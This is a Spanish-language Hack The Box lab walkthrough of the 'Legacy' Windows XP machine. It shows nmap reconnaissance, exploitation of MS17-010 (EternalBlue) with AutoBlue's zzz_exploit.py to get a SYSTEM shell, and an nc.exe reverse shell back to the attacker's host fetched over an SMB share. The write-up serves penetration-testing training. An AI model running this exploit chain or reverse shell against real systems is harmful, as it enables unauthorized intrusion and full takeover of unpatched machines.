---
title: Hack The Box Legacy
author: k4miyo
date: 2021-09-06
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Windows, Injection]
ping: true
---

## Legacy
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.4.

```bash
❯ ping -c 1 10.10.10.4
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=145 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 145.076/145.076/145.076/0.000 ms

```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.4 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-27 22:23 CDT
Initiating SYN Stealth Scan at 22:23
Scanning 10.10.10.4 [65535 ports]
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 445/tcp on 10.10.10.4
Completed SYN Stealth Scan at 22:24, 26.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.15s latency).
Scanned at 2021-08-27 22:23:35 CDT for 26s
Not shown: 65532 filtered ports, 1 closed port
Reason: 65532 no-responses and 1 reset
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 21 (920B)

```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.4
   5   │     [*] Open ports: 139,445
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 

```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p139,445 10.10.10.4 -oN targeted
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-27 22:26 CDT
Nmap scan report for 10.10.10.4
Host is up (0.15s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h32m17s, deviation: 2h07m16s, median: 4d23h02m17s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:1f:58 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-09-02T08:29:19+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.41 seconds
```

Observamos que se encuentra abierto el puerto 445/TCP, por lo que procedemos a validar si es vulnerable al **Eternal Blue**. Descargamos el repositorio AutoBlue-MS17-010 y primeramente, ejecutarmos el archivo `eternal_checker.py`.

[AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

```bash
❯ git clone https://github.com/3ndG4me/AutoBlue-MS17-010
Clonando en 'AutoBlue-MS17-010'...
remote: Enumerating objects: 126, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 126 (delta 40), reused 35 (delta 35), pack-reused 76
Recibiendo objetos: 100% (126/126), 94.22 KiB | 945.00 KiB/s, listo.
Resolviendo deltas: 100% (74/74), listo.
❯ cd AutoBlue-MS17-010/
❯ python eternal_checker.py 10.10.10.4
[*] Target OS: Windows 5.1
[!] The target is not patched
=== Testing named pipes ===
[+] Found pipe 'browser'
[*] Done

```

Con esto validamos que la máquina es vulnerable al exploit, por tanto se procede a ejecutar:

```bash
❯ python zzz_exploit.py -target-ip 10.10.10.4 -port 445 10.10.10.4
[*] Target OS: Windows 5.1
[+] Found pipe 'browser'
[+] Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x821a9da8
SESSION: 0xe20e3190
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
[*] make this SMB session to be SYSTEM
[+] current TOKEN addr: 0xe1bc7030
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1bc70d0
[*] overwriting token UserAndGroups
[*] have fun with the system smb session!
[!] Dropping a semi-interactive shell (remember to escape special chars with ^) 
[!] Executing interactive programs will hang shell!
C:\WINDOWS\system32>
```

Para manejarnos mejor, establecemos una nueva conexión, en caso que en el programa nos bote. Primero nos transferimos el programa **nc.exe**, nos ponemos en escucha por el puerto 443 y procedemos a ejecutar el archivo estableciendo la conexión.

```bash
C:\WINDOWS\system32>mkdir C:\Windows\Temp\test

C:\WINDOWS\system32>copy \\10.10.14.15\smbFolder\nc.exe C:\Windows\Temp\test\nc.exe
        1 file(s) copied.

C:\WINDOWS\system32>
C:\WINDOWS\system32>C:\Windows\Temp\test\nc.exe -e cmd 10.10.14.15 443
```

```bash
❯ impacket-smbserver smbFolder $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.4,1045)
[*] AUTHENTICATE_MESSAGE (\,LEGACY)
[*] User LEGACY\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
[*] Closing down connection (10.10.10.4,1045)
[*] Remaining connections []

❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.4] 1048
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

```

Con esta conexión ya podemos movernos con mayor facilidad. Ya somos administradores del equipo y podemos visualizar las flags (user.txt y root.txt).
